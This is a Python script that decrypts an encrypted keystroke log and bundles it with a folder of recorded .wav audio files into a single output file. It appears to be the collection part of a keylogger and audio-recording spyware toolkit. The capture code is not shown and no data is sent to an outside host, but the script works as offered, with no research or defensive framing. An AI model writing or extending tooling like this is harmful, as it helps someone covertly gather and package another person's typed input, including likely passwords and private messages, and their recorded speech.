from cryptography.fernet import Fernet
import os

# Load encryption key
def load_key():
    with open("key.key", "rb") as key_file:
        return key_file.read()

cipher = Fernet(load_key())
KEYSTROKES_FILE = "keystrokes.log"
AUDIO_DIR = "audio_logs"
COMBINED_FILE = "combined_output.bin"

# Function to decrypt keystrokes
def decrypt_keystrokes():
    decrypted_keystrokes = []
    with open(KEYSTROKES_FILE, "rb") as file:
        for line in file:
            decrypted_data = cipher.decrypt(line.strip())
            decrypted_keystrokes.append(decrypted_data.decode())
    return "\n".join(decrypted_keystrokes)

# Function to combine keystrokes and audio files into a single file
def combine_files():
    # Open combined file in binary write mode
    with open(COMBINED_FILE, "wb") as combined:
        # Write decrypted keystrokes
        combined.write(b"--- Start of Keystrokes ---\n")
        keystrokes = decrypt_keystrokes()
        combined.write(keystrokes.encode())
        combined.write(b"\n--- End of Keystrokes ---\n\n")

        # Write audio files
        for audio_filename in sorted(os.listdir(AUDIO_DIR)):
            if audio_filename.endswith(".wav"):
                audio_path = os.path.join(AUDIO_DIR, audio_filename)
                combined.write(f"--- Start of {audio_filename} ---\n".encode())
                
                with open(audio_path, "rb") as audio_file:
                    audio_data = audio_file.read()
                    combined.write(audio_data)
                
                combined.write(f"\n--- End of {audio_filename} ---\n\n".encode())

    print(f"Combined file created as: {COMBINED_FILE}")

# Run the combination process
combine_files()
